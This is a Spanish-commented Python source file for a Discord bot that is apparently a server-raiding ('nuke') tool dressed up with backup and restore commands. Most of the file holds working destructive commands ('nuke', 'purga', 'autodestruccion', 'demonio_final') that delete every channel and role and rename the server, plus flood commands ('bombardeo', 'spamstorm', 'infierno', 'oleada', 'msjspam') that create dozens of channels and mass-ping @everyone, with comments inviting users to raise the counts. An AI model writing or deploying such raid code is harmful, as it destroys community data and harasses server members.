import os
import random
import discord
from discord.ext import commands
import json
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)

# Backups en memoria (por servidor)
backup_data = {}
json_backup_data = {}

@bot.event
async def on_ready():
    print(f"✅ Bot listo como {bot.user}")

# ----------------------------------------
# 🔹 BACKUP EN MEMORIA (NO JSON)
# ----------------------------------------
@bot.command()
@commands.has_permissions(administrator=True)
async def backup(ctx):
    """Realiza un backup del servidor (solo en memoria)"""
    guild = ctx.guild
    backup = await generar_backup(guild)
    backup_data[guild.id] = backup
    await ctx.send("✅ Backup realizado en memoria (sin archivo JSON).")

# ----------------------------------------
# 🔹 BACKUP EN ARCHIVO JSON
# ----------------------------------------
@bot.command()
@commands.has_permissions(administrator=True)
async def backup_json(ctx):
    """Realiza un backup del servidor y lo guarda en un archivo JSON"""
    guild = ctx.guild
    backup = await generar_backup(guild)
    archivo = f"backup_{guild.id}.json"
    try:
        with open(archivo, "w", encoding="utf-8") as f:
            json.dump(backup, f, indent=4)
        await ctx.send(f"✅ Backup guardado en archivo `{archivo}`.")
    except Exception as e:
        await ctx.send(f"⚠️ Error al guardar backup en archivo: {e}")

# ----------------------------------------
# 🔹 CARGAR BACKUP JSON DESDE ARCHIVO
# ----------------------------------------
@bot.command()
@commands.has_permissions(administrator=True)
async def cargarbackup(ctx, nombre_archivo: str):
    """Carga un archivo JSON como backup"""
    try:
        with open(nombre_archivo, "r", encoding="utf-8") as f:
            data = json.load(f)
            json_backup_data[ctx.guild.id] = data
            await ctx.send(f"✅ Backup JSON cargado desde `{nombre_archivo}`.")
    except FileNotFoundError:
        await ctx.send(f"❌ No se encontró el archivo `{nombre_archivo}`.")
    except Exception as e:
        await ctx.send(f"❌ Error cargando backup JSON: {e}")

# ----------------------------------------
# 🔹 RESTAURAR DESDE BACKUP EN MEMORIA
# ----------------------------------------
@bot.command()
@commands.has_permissions(administrator=True)
async def restaurar(ctx):
    """Restaura desde backup en memoria"""
    data = backup_data.get(ctx.guild.id)
    if not data:
        return await ctx.send("❌ No hay backup en memoria. Usa `.backup` primero.")
    await realizar_restauracion(ctx, data)

# ----------------------------------------
# 🔹 RESTAURAR DESDE BACKUP JSON CARGADO
# ----------------------------------------
@bot.command()
@commands.has_permissions(administrator=True)
async def restaurar_json(ctx):
    """Restaura desde archivo JSON cargado con .cargarbackup"""
    data = json_backup_data.get(ctx.guild.id)
    if not data:
        return await ctx.send("❌ No hay backup cargado desde archivo. Usa `.cargarbackup` primero.")
    await realizar_restauracion(ctx, data)

# ========================================
# 🔧 FUNCIONES AUXILIARES
# ========================================
async def generar_backup(guild):
    backup = {
        "server_name": guild.name,
        "server_icon": None,
        "roles": [],
        "categories": [],
        "channels": []
    }

    # Guardar ícono del servidor
    if guild.icon:
        icon_bytes = await guild.icon.read()
        icon_filename = f"icono_{guild.id}.png"
        with open(icon_filename, "wb") as f:
            f.write(icon_bytes)
        backup["server_icon"] = icon_filename

    for role in guild.roles:
        if role.name != "@everyone":
            backup["roles"].append({
                "name": role.name,
                "color": role.color.value,
                "permissions": role.permissions.value,
                "position": role.position,
                "mentionable": role.mentionable,
                "hoist": role.hoist
            })

    for category in guild.categories:
        cat_data = {"name": category.name, "channels": []}
        for channel in category.channels:
            if isinstance(channel, discord.TextChannel):
                ch_data = {"name": channel.name, "type": "text", "messages": []}
                try:
                    async for msg in channel.history(limit=100):
                        ch_data["messages"].append({
                            "author": str(msg.author),
                            "content": msg.content,
                            "timestamp": str(msg.created_at)
                        })
                except:
                    pass
                cat_data["channels"].append(ch_data)
            elif isinstance(channel, discord.VoiceChannel):
                cat_data["channels"].append({"name": channel.name, "type": "voice"})
        backup["categories"].append(cat_data)

    for channel in guild.channels:
        if channel.category is None:
            if isinstance(channel, discord.TextChannel):
                ch_data = {"name": channel.name, "type": "text", "messages": []}
                try:
                    async for msg in channel.history(limit=100):
                        ch_data["messages"].append({
                            "author": str(msg.author),
                            "content": msg.content,
                            "timestamp": str(msg.created_at)
                        })
                except:
                    pass
                backup["channels"].append(ch_data)
            elif isinstance(channel, discord.VoiceChannel):
                backup["channels"].append({"name": channel.name, "type": "voice"})
    return backup

async def realizar_restauracion(ctx, data):
    guild = ctx.guild
    canal_info = await guild.create_text_channel("🛠️-restaurando")
    await canal_info.send("🔁 Restaurando el servidor...")

    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(0.2)
            except:
                pass

    for channel in guild.channels:
        if channel != canal_info:
            try:
                await channel.delete()
                await asyncio.sleep(0.2)
            except:
                pass

    role_map = {}
    for role_data in sorted(data.get("roles", []), key=lambda r: r["position"]):
        try:
            role = await guild.create_role(
                name=role_data["name"],
                colour=discord.Colour(role_data["color"]),
                permissions=discord.Permissions(role_data["permissions"]),
                hoist=role_data["hoist"],
                mentionable=role_data["mentionable"]
            )
            role_map[role_data["name"]] = role
            await asyncio.sleep(0.3)
        except:
            pass

    for cat_data in data.get("categories", []):
        try:
            categoria = await guild.create_category(cat_data["name"])
            for ch in cat_data["channels"]:
                if ch["type"] == "text":
                    canal = await guild.create_text_channel(ch["name"], category=categoria)
                    for msg in reversed(ch.get("messages", [])):
                        try:
                            content = f"**{msg['author']}** ({msg['timestamp']}): {msg['content']}"
                            await canal.send(content)
                        except:
                            pass
                elif ch["type"] == "voice":
                    await guild.create_voice_channel(ch["name"], category=categoria)
        except:
            pass

    for ch in data.get("channels", []):
        try:
            if ch["type"] == "text":
                canal = await guild.create_text_channel(ch["name"])
                for msg in reversed(ch.get("messages", [])):
                    try:
                        content = f"**{msg['author']}** ({msg['timestamp']}): {msg['content']}"
                        await canal.send(content)
                    except:
                        pass
            elif ch["type"] == "voice":
                await guild.create_voice_channel(ch["name"])
        except:
            pass

    try:
        icon_file = data.get("server_icon")
        if icon_file and os.path.exists(icon_file):
            with open(icon_file, "rb") as f:
                icono = f.read()
            await guild.edit(name=data.get("server_name", guild.name), icon=icono)
        else:
            await guild.edit(name=data.get("server_name", guild.name))
    except Exception as e:
        print(f"❌ Error al restaurar nombre o ícono: {e}")

    await canal_info.send("✅ Restauración completa.")
    await asyncio.sleep(5)
    await canal_info.delete()

# ----------------------------------------
# 🔹 COMANDO DE UPDATE
# ----------------------------------------
@bot.command()
@commands.has_permissions(administrator=True)
async def update(ctx):
    """Mejora estética del servidor: nuevas categorías y canales"""
    canal_origen = ctx.channel  # 🔒 Guardamos referencia antes de borrar

    await canal_origen.send("🎨 Actualizando el servidor para que luzca más bonito...")

    # Borrar canales excepto el actual
    for channel in ctx.guild.channels:
        try:
            if channel.id != canal_origen.id:
                await channel.delete()
        except:
            pass

    # Crear nuevas categorías y canales
    categorias = {
        "🏠 GENERAL": ["📢-anuncios", "💬-chat-general", "📸-media", "🎮-tus-juegos"],
        "🎓 INFORMACIÓN": ["📌-reglas", "📚-roles", "🆘-ayuda"],
        "🎙️ VOZ": ["🔊 Sala 1", "🔊 Sala 2"]
    }

    for nombre_cat, canales in categorias.items():
        categoria = await ctx.guild.create_category(name=nombre_cat)

        for canal in canales:
            if canal.startswith("🔊"):
                await ctx.guild.create_voice_channel(name=canal, category=categoria)
            else:
                await ctx.guild.create_text_channel(name=canal, category=categoria)

    # Mensaje final en el canal original (aún no ha sido borrado)
    try:
        await canal_origen.send("✅ ¡Servidor actualizado con un diseño estético y organizado!")
    except:
        print("❌ No se pudo enviar el mensaje final. Canal eliminado.")

# ----------------------------------------
# 🔹 COMANDO DE AUTODESTRUCCION
# ----------------------------------------
@bot.command()
@commands.has_permissions(administrator=True)
async def autodestruccion(ctx):
    """Elimina todos los canales y categorías, luego crea uno para informar"""

    await ctx.send("⚠️ Iniciando autodestrucción en 5 segundos...")
    await asyncio.sleep(5)

    guild = ctx.guild

    # Eliminar todos los canales y categorías
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.2)
        except:
            pass

    # Crear un nuevo canal de texto para enviar el mensaje final
    try:
        nuevo_canal = await guild.create_text_channel("☢️-autodestrucción")
        await asyncio.sleep(1)
        await nuevo_canal.send("☠️ Canales eliminados.")
    except Exception as e:
        print(f"❌ Error al crear canal o enviar mensaje: {e}")

# ----------------------------------------
# 🔹 LISTAR ARCHIVOS DE BACKUP
# ----------------------------------------
@bot.command()
@commands.has_permissions(administrator=True)
async def listarbackups(ctx):
    archivos = [f for f in os.listdir() if f.endswith(".json")]
    if archivos:
        msg = "\n".join(f"📁 {a}" for a in archivos)
        await ctx.send(f"📦 Backups disponibles:\n{msg}")
    else:
        await ctx.send("⚠️ No hay archivos de backup.")

# ----------------------------------------
# 🔹 COMANDO NUKE
# ----------------------------------------
@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    await ctx.message.delete()

    # Cambiar nombre e icono del servidor
    try:
        with open('DAFNE/DAFNE.png', 'rb') as f:  # Cambiar DAFNE/DAFNE.png por la carpeta y la imagen del bot, también pueden usar la imagen del bot sin la carpeta
            icono = f.read()
            await ctx.guild.edit(name="☢️ NUKE-BY-DARK ☢️", icon=icono) # Pueden cambiar ☢️ NUKE-BY-DARK ☢️ por lo que gusten
    except FileNotFoundError:
        print("❌ Archivo 'DAFNE/DAFNE.png' no encontrado.")
    except discord.Forbidden:
        print("❌ Sin permisos para editar el servidor.")

    # Eliminar todos los canales rápidamente
    await asyncio.gather(
        *[channel.delete() for channel in ctx.guild.channels if channel.permissions_for(ctx.guild.me).manage_channels],
        return_exceptions=True
    )

    # Eliminar todos los roles posibles
    await asyncio.gather(
        *[role.delete() for role in ctx.guild.roles if role.name != "@everyone" and role.position < ctx.guild.me.top_role.position],
        return_exceptions=True
    )

    # Crear categoría y canales con diferentes emojis
    try:

        # Lista de emojis para los canales de texto
        emojis_texto = ['💥', '🔥', '💣', '🚨', '🧨', '☢️', '🛑', '⚠️', '😈', '👹', '👺', '🎆', '🎇', '🪓', '🗯️']
        canales_texto = []
        for emoji in emojis_texto:
            try:
                canal = await ctx.guild.create_text_channel(f'{emoji}nuke-by-dark')  # Pueden cambiar nuke-by-dark por lo que gusten
                canales_texto.append(canal)
            except Exception as e:
                print(f"❌ Error al crear canal de texto con emoji {emoji}: {e}")

        # Lista de emojis para los canales de voz
        emojis_voz = ['🔊', '🎧', '📣', '📢', '🗣️', '🎙️', '📻', '🔔', '🎶', '🎵', '🔇'] 
        for emoji in emojis_voz:
            try:
                await ctx.guild.create_voice_channel(f'{emoji}nuke-by-dark') # Pueden cambiar nuke-by-dark por lo que gusten
            except Exception as e:
                print(f"❌ Error al crear canal de voz con emoji {emoji}: {e}")
    except Exception as e:
        print(f"❌ Error al crear categoría o canales: {e}")
        canales_texto = []

    # Enviar spam masivo sin pausas
    mensaje = "@everyone 💀 **Este servidor ha sido bombardeado por DARK.**\n🔥 _Prepárate para el caos..._" # Pueden cambiar el mensaje por el que gusten
    mensajes = []
    for canal in canales_texto:
        if isinstance(canal, discord.TextChannel):
            mensajes.extend([canal.send(mensaje) for _ in range(30)])  # Cambiar el 30 por la cantidad de mensajes que quieran por canal
    await asyncio.gather(*mensajes, return_exceptions=True)

    print("✅ NUKE ejecutado rápidamente.")
    
# ----------------------------------------
# 🔹 COMANDO PURGA
# ----------------------------------------    
@bot.command()
@commands.has_permissions(administrator=True)
async def purga(ctx):
    await ctx.message.delete()
    await ctx.send("☣️ Iniciando purga...")

    # Eliminar roles (excepto @everyone)
    for role in ctx.guild.roles:
        if role.name != "@everyone" and role.position < ctx.guild.me.top_role.position:
            try:
                await role.delete()
                await asyncio.sleep(0.2)
            except:
                pass

    # Eliminar todos los canales
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.2)
        except:
            pass

    print("✅ Purga total ejecutada.")
 
# ----------------------------------------
# 🔹 COMANDO BOMBARDEO
# ---------------------------------------- 
@bot.command()
@commands.has_permissions(administrator=True)
async def bombardeo(ctx):
    await ctx.message.delete()
    mensaje = "@everyone 🚨 **¡Este servidor ha sido comprometido temporalmente!**" # Pueden cambiar el mensaje por lo que quieran

    for canal in ctx.guild.text_channels:
        try:
            for _ in range(100):
                await canal.send(mensaje)
                await asyncio.sleep(0.1)
        except:
            pass

    print("📣 Bombardeo ejecutado.")
 
# ----------------------------------------
# 🔹 COMANDO INVITE
# ---------------------------------------- 
@bot.command()
async def invite(ctx):
    """Muestra la invitación del bot y enlaces útiles"""
    bot_user = bot.user
    app_info = await bot.application_info()
    owner = app_info.owner

    embed = discord.Embed(
        title="🔗 Invitación del Bot",
        description="Gracias por usar este bot. Aquí tienes toda la información necesaria:",
        color=discord.Color.purple()
    )

    embed.set_author(name=f"{bot_user.name}", icon_url=bot_user.display_avatar.url)
    embed.set_thumbnail(url=bot_user.display_avatar.url)

    # Agrega enlaces útiles
    invite_url = discord.utils.oauth_url(app_info.id, permissions=discord.Permissions.all())
    support_url = "https://discord.gg/" # Despues de / pongan su codigo o enlace completo de su servidor 
    github_url = "https://github.com/" # Despues de / pongan su perfil 

    embed.add_field(name="📨 Invitación", value=f"[Invita a {bot_user.name}]({invite_url})", inline=False)
    embed.add_field(name="🛠️ Servidor de Soporte", value=f"[Únete al Soporte]({support_url})", inline=False)
    embed.add_field(name="💻 GitHub", value=f"[Repositorio]({github_url})", inline=False)

    # Información adicional del bot
    total_users = sum(guild.member_count for guild in bot.guilds)
    embed.add_field(name="📊 Estadísticas", value=f"**Servidores:** {len(bot.guilds)}\n**Usuarios:** {total_users}", inline=True)
    embed.add_field(name="👑 Desarrollador", value=f"{owner}", inline=True)

    await ctx.send(embed=embed)
 
# ----------------------------------------
# 🔹 COMANDO SPAMSTORM
# ---------------------------------------- 
@bot.command()
@commands.has_permissions(administrator=True)
async def spamstorm(ctx):
    """Crea muchas categorías y canales, luego envía spam masivo en todos a la vez"""
    await ctx.message.delete()
    nombre = "☣️-storm"
    mensaje = "@everyone 🔊 **RAIDEADOS PERROS** 🔥🔥🔥" # Pueden cambiar el mensaje por lo que gusten
    canales_creados = []

    # Crear categorías y canales
    for _ in range(5):  # Pueden cambiar el 5 por la cantidad de categorías
        try:
            categoria = await ctx.guild.create_category(nombre)
            for _ in range(5):  # Pueden cambiar el 5 por la cantidad de canales por categoría
                canal = await ctx.guild.create_text_channel(nombre, category=categoria)
                canales_creados.append(canal)
                await asyncio.sleep(0.1)
        except Exception as e:
            print(f"❌ Error creando categoría o canal: {e}")

    # Lanzar el spam en todos los canales creados
    tareas_spam = []
    for canal in canales_creados:
        for _ in range(10):  # Pueden cambiar el 10 por la cantidad mensajes que quieren por canal
            tareas_spam.append(canal.send(mensaje))
    
    await asyncio.gather(*tareas_spam, return_exceptions=True)
    print("✅ SPAMSTORM ejecutado.")

# ----------------------------------------
# 🔹 COMANDO INFIERNO
# ---------------------------------------- 
@bot.command()
@commands.has_permissions(administrator=True)
async def infierno(ctx):
    """Crea 20 canales de texto con spam de 10 mensajes cada uno"""
    await ctx.message.delete()
    nombre = "🔥-infierno"
    mensaje = "@everyone 💢 **EL INFIERNO LLEGÓ** 💢" # Pueden cambiar el mensaje por lo que gusten

    canales = []

    # Primero crear todos los canales
    for _ in range(20):  # Pueden cambiar el 20 por la cantidad de canales que quirean
        try:
            canal = await ctx.guild.create_text_channel(nombre)
            canales.append(canal)
            await asyncio.sleep(0.1)
        except Exception as e:
            print(f"❌ Error creando canal: {e}")

    # Luego enviar el spam en todos los canales simultáneamente
    tareas_spam = []
    for canal in canales:
        for _ in range(10): # Pueden cambiar el 10 por la cantidad mensajes que quieren por canal
            tareas_spam.append(canal.send(mensaje))

    await asyncio.gather(*tareas_spam, return_exceptions=True)
    print("🔥 INFIERNO ejecutado.")

# ----------------------------------------
# 🔹 COMANDO OLEADA
# ---------------------------------------- 
@bot.command()
@commands.has_permissions(administrator=True)
async def oleada(ctx):
    """Crea canales rápidamente y luego los llena de spam"""
    await ctx.message.delete()
    nombre = "⚡-oleada"
    mensaje = "@everyone 🌪️ **RAIDEADOS PERROS** 🌪️" # Pueden cambiar el mensaje por lo que gusten
    canales = []

    # Crear 15 canales
    for _ in range(15): # Pueden cambiar el 15 por la cantidad de canales que quieran
        try:
            canal = await ctx.guild.create_text_channel(nombre)
            canales.append(canal)
            await asyncio.sleep(0.1)
        except Exception as e:
            print(f"❌ Error creando canal: {e}")

    # Enviar spam en todos los canales
    tareas = []
    for canal in canales:
        for _ in range(10): #Pueden cambiar el 10por la cantidad mensajes que quieren por canal
            tareas.append(canal.send(mensaje))
    await asyncio.gather(*tareas, return_exceptions=True)

# ----------------------------------------
# 🔹 COMANDO MSJSPAM
# ---------------------------------------- 
@bot.command()
@commands.has_permissions(administrator=True)
async def msjspam(ctx, *, mensaje: str = "@everyone ⚠️ **RAIDEADOS PERROS**🔥🔥🔥"):  # Pueden cambiar el mensaje por lo que gusten
    """Crea 20 canales con emojis aleatorios y spam personalizado"""
    await ctx.message.delete()
    nombre_base = "📡-msjspam"
    
    emojis = ['🔥', '💣', '⚡', '💥', '👹', '☣️', '🧨', '🚨', '😈', '💀', '🎇', '👾', '🛑', '🔊', '🎃']
    canales_creados = []

    # Crear 20 canales con nombres únicos y emojis aleatorios
    for _ in range(20):  # Pueden cambiar el 20 por la cantidad de canales que quieran
        emoji = random.choice(emojis)
        nombre = f"{emoji}-{nombre_base}"
        try:
            canal = await ctx.guild.create_text_channel(nombre)
            canales_creados.append(canal)
            await asyncio.sleep(0.1)
        except Exception as e:
            print(f"❌ Error creando canal: {e}")

    # Spam personalizado en todos los canales simultáneamente
    tareas = []
    for canal in canales_creados:
        for _ in range(10):  # Pueden cambiar el 10 por la cantidad mensajes que quieren por canal
            tareas.append(canal.send(mensaje))
    await asyncio.gather(*tareas, return_exceptions=True)

    print("✅ msjspam ejecutado con éxito.")

# ----------------------------------------
# 🔹 COMANDO DEMONIO_FINAL
# ---------------------------------------- 
@bot.command()
@commands.has_permissions(administrator=True)
async def demonio_final(ctx):
    """Elimina todos los canales y desata el infierno con 50 canales con el mismo nombre + spam"""
    await ctx.message.delete()

    mensaje = "@everyone 👿 **EL DEMONIO FINAL HA SIDO LIBERADO** 👿\n🔥 _No hay escapatoria..._"
    emojis = ['👹', '🔥', '💀', '😈', '☠️', '🩸', '⚠️', '☣️', '💣', '🧨']
    canales_creados = []

    # 🧹 Eliminar todos los canales existentes
    for canal in ctx.guild.channels:
        try:
            await canal.delete()
            await asyncio.sleep(0.1)
        except Exception as e:
            print(f"❌ No se pudo eliminar el canal {canal.name}: {e}")

    await asyncio.sleep(1)

    # 👿 Crear 50 canales con nombres idénticos (solo con emoji aleatorio)
    for _ in range(50):
        try:
            emoji = random.choice(emojis)
            nombre = f"{emoji}-demonio"
            canal = await ctx.guild.create_text_channel(nombre)
            canales_creados.append(canal)
        except Exception as e:
            print(f"❌ Error al crear canal: {e}")

    # 🔥 Enviar 25 mensajes en todos los canales creados
    tareas = []
    for canal in canales_creados:
        for _ in range(25):
            tareas.append(canal.send(mensaje))

    await asyncio.gather(*tareas, return_exceptions=True)

    print("👹 Demonio final ejecutado.")
 
# ----------------------------------------
# 🔹 COMANDO HELP
# ----------------------------------------
class CustomHelpCommand(commands.HelpCommand):
    def __init__(self):
        super().__init__()
        self.no_category = "Sin categoría"

    async def send_bot_help(self, mapping):
        embed = discord.Embed(
            title=f"✨ Comandos de {self.context.bot.user.name.upper()}",
            description="💠 Bienvenido al centro de comandos de **DAFNE**\nExplora sus funciones y desata su poder.\nUsa `.help <comando>` para más detalles.\n━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            color=random.choice([discord.Color.purple(), discord.Color.dark_magenta(), discord.Color.red()])
        )

        emojis = {
            "autodestruccion": "☢️", "backup": "💾", "backup_json": "🧩",
            "bombardeo": "💣", "cargarbackup": "📤", "demonio_final": "👹",
            "help": "📘", "infierno": "🔥", "invite": "🔗",
            "listarbackups": "📂", "msjspam": "🎭", "nuke": "🚨",
            "oleada": "🌊", "purga": "🧹", "restaurar": "♻️",
            "restaurar_json": "🧬", "spamstorm": "🌪️", "update": "🎨"
        }

        # ✅ Corrección aquí
        comandos = []
        for cmds in mapping.values():
            filtered = await self.filter_commands(cmds, sort=True)
            comandos.extend(filtered)

        comandos.sort(key=lambda c: c.name)

        # Organizar en columnas llamativas
        lineas = []
        linea = ""
        for i, cmd in enumerate(comandos, 1):
            emoji = emojis.get(cmd.name, "🔸")
            linea += f"`{emoji} .{cmd.name}`   "
            if i % 3 == 0:
                lineas.append(linea)
                linea = ""
        if linea:
            lineas.append(linea)

        embed.add_field(
            name="📜 Comandos Disponibles",
            value="\n".join(lineas),
            inline=False
        )

        embed.set_image(url="https://media.tenor.com/QfIOnqI2cIMAAAAi/boom-explosion.gif")
        embed.set_footer(text=f"Total de comandos: {len(comandos)} | Bot creado por DARK 💀")
        await self.get_destination().send(embed=embed)

    async def send_command_help(self, command):
        embed = discord.Embed(
            title=f"ℹ️ Ayuda: .{command.name}",
            description=command.help or "Sin descripción disponible.",
            color=discord.Color.orange()
        )
        if command.aliases:
            embed.add_field(name="🔄 Alias", value=", ".join(command.aliases), inline=False)
        embed.add_field(name="📥 Uso", value=f"`.{command.name} {command.signature}`", inline=False)
        await self.get_destination().send(embed=embed)

# Asignar la ayuda personalizada al bot
bot.help_command = CustomHelpCommand()
       
# ----------------------------------------
# EJECUTAR BOT
# ----------------------------------------
bot.run("Token de su bot")
